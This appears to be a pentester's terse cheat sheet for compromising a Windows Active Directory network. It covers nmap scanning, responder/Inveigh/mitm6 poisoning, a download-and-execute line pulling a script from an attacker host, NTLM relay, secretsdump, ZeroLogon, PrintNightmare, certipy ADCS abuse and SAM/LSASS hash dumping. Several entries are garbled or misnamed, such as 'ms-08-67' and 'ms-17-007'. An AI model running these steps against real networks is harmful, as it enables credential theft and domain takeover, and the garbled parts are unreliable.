#### Enumerate the network for active hosts
Ping scan to quickly find active hosts
-  `nmap -sn 192.168.1.0/24 -oA nmap/ping_scan`
 Then find top 100 ports on the network 
-  `nmap -Pn 192.168.1.0/24 -F -oA nmap/top_100_ports`
Full scan
-  `nmap 192.168.1.0/24 -Pn -p- -oA nmap/full_scan`

#### Enumerate the domain
Discover the domain name
- check `/etc/resolv.conf` or run `ipconfig /all` to discover the DNS suffix
ac
Once you know domain name, find domain controller ip address:
- `nslookup domain_name`

Start poisoning:
- `responder -I eth0`
- windows(`enveigh-relay`)
	- `iex(iwr http://kali-ip/inveigh.ps1)`
- `mitm6`

Check smb version 
- `cme smb domain_ip`

Bloodhound(creds)
- Custom queries

Use coercer to get domain admin ntlm hash 

cme password spraying
netntlmv1

!!! responder 

ntlm-relay: 
secretsdump.py
- request hashes of any user in the domain

zero-logon(no)
- destroys domain controller

PrintNightmare
Hive Nightmare
  - priv esc

Bloodhound(creds)
- Custom queries(download me)


ms-08-67
ms-17-007


ADCS - active directory certificate services
- `certipy`
  - find vulnerable adcs configurations: `certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128`


Enumerating open file shares
smbmap, check for null sessions

sam
- check for local reuse of password hash

lsass
- stores passwords in memory
`cme` has `sam` and `lsa`

dns subrecords
- sublister
- gobuster
